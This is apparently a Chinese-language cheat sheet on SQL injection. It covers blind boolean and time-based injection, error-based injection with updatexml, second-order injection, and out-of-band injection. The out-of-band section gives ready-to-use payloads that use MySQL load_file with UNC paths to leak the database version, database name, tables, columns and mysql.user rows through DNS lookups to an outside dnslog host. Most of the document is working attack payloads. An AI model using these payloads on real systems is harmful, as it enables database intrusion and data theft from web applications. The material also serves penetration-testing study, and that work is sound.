## 盲注

基于布尔

​	有数据库输出作为判断标准

基于时间

```
if(条件, sleep(3) ,0)
条件sleep3秒 否则返回0

if(length(database())=3, sleep(3) ,sleep(0))
if(left(database(),1)='s', sleep(3) ,sleep(0))
```

基于报错

​	要有报错处理语句，不然不报错

```
updatexml(1,concat(0x7e,(select user()),0x7e),1)
```

## 二次注入

1、需要有addslashes()函数对单引号进行转义或者开启`magic_quotes_gpc`才行，否则插入不进数据库，因为你想插入数据库的语句中有单引号

转义其实就是“你写的是什么，它存的就是什么，单引号不会对sql语句的执行造成干扰”

```
$_username = addslashes($_POST['username']);
```

2、后续有利用插入数据的地方

## 外带注入

https://www.cnblogs.com/wuhongbin/p/15582944.html

- load_file() 不仅能够加载本地文件，同时也能对诸如[www.test.com](http://www.test.com/)这样的URL发起请求。
- load_file() 加载文件' '，是对' \ '的转义，load_file读取文件和windows读取文件调用的都是c的fopen()函数，而双斜杠表示网络资源路径，即UNC路径，于是发起了dns请求

条件：

1、高权限 root

2、secure_file_priv 拥有读写权限

```
secure_file_priv = ""       # 可以读取磁盘目录
secure_file_priv = "D:\"    # 可以读取D盘文件
secure_file_priv = null     # load_file限制，不能加载文件
```

- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件

```
show global variables like 'secure%';  //查看是否有写限制
```

mysql中常见payload：

- 查看版本号

```sql
 ?id=1 union select 1,load_file(concat('\\\\',( select version()),'.2hlktd.dnslog.cn\\a')),3--+
```

- 查库名

```sql
?id=1 union select 1,load_file(concat('\\\\',( select database()),'.2hlktd.dnslog.cn\\a')),3--+
```

- 查表名

```sql
select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='mysql' limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```

- 查列名

```sql
select load_file(concat('\\\\',( select column_name from information_schema.columns where table_schema = 'mysql' and table_name = 'users' limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```

- 查数据

```sql
select load_file(concat('\\\\',( select id from mysql.user limit 0,1),'.2hlktd.dnslog.cn\\a'))--+
```
